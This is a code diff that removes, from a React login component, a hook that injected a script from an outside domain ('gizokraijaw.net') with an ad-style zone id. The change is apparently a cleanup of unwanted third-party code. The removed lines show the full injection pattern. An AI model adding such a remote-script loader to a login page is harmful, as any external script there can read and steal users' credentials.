@@ -22,24 +22,6 @@ export default function Login() {
   const [isLoading, setIsLoading] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
 
-  useEffect(() => {
-    const script = document.createElement("script");
-    script.dataset.zone = "10675508";
-    script.src = "https://gizokraijaw.net/vignette.min.js";
-    const container = [document.documentElement, document.body]
-      .filter(Boolean)
-      .pop();
-    if (container) {
-      container.appendChild(script);
-    }
-
-    return () => {
-      if (container && script.parentNode === container) {
-        container.removeChild(script);
-      }
-    };
-  }, []);
-
   const validateForm = (): string | null => {
     if (!email.trim()) {
       return "Email address is required";
